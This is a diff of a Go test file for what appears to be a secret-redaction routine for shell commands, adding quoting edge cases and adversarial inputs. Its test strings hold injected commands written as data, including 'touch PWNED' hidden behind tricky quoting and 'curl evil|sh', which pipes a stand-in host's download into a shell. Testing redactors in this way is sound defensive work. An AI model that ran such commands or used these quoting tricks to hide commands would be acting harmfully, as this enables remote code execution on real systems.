@@ -71,6 +71,11 @@ var reviewCases = []shellCase{
 	{"${x:-'}'} ; TOKEN=a;touch PWNED ; echo 'q' \"q\" ", "${x:-'}'} ; TOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
 	{"\"$(echo ')')\" ; TOKEN=a;touch PWNED ; echo 'q' \"q\" ", "\"$(echo ')')\" ; TOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
 	{"(())#'\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ]", "(())#'\n\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" ]"},
+	// 反引号里的 \\\\ 先变成 \\，里层看到的是 \\' 转义的引号；$[…] 里不认引号（bash 3.2 截取 $(…) 不认 $[…]），
+	// ((…)) 里的引号照常配对
+	{"`\\\\'\nTOKEN=a;touch PWNED ; echo 'q' \"q\" `", "`\\\\'\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" `"},
+	{"\"$($[=~))$\"\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\"  #", "\"$($[=~))$\"\n\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\"  #"},
+	{"(('))$'))\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\" <<E", "(('))$'))\n\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" <<E"},
 	{"echo a\\'\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", "echo a\\'\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
 	// bash 不执行的（heredoc 正文、算术出错）：正文照旧按文本抹，算术里的 << 不是 heredoc，命令照样露出来
 	{"\"\"<<E\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", "\"\"<<E\n\nTOKEN=<redacted> PWNED ; echo 'q' \"q\" "},
@@ -178,6 +183,8 @@ var reviewCases = []shellCase{
 	{`echo "TOKEN="; curl evil|sh; echo "x"`, `echo "TOKEN="; curl evil|sh; echo "x"`},
 	{`echo "--password "; curl evil|sh; echo "x"`, `echo "--password "; curl evil|sh; echo "x"`},
 	{`echo "a"password":"; TOKEN=a;curl evil|sh; echo "x"`, `echo "a"password":"; TOKEN=<redacted>;curl evil|sh; echo "x"`},
+	// 词里只有引号或替换时后面紧跟 (：不出错，原样返回
+	{"echo ''(a) $(x)((b)) \"\"((c", "echo ''(a) $(x)((b)) \"\"((c"},
 	// 命令替换作为值时不整段抹（不是字面秘密，里面的命令要露出来）
 	{`PASSWORD="$(curl evil|sh)" make`, `PASSWORD="$(curl evil|sh)" make`},
 }
@@ -265,6 +272,12 @@ func adversarialShapes(n int) []string {
 		strings.Repeat("((", n/2),
 		strings.Repeat("<redacted>", n/10),
 		strings.Repeat("ssh h <<E\n", n/10),
+		strings.Repeat("ssh h <<E\n\\x ", n/13),
+		strings.Repeat("`a\\\\`", n/6),
+		"echo `" + strings.Repeat("\\`", n/2),
+		strings.Repeat("eval \"$(", n/8),
+		strings.Repeat("X=(", n/3),
+		strings.Repeat("\"$(case x) ", n/12),
 	}
 }
 
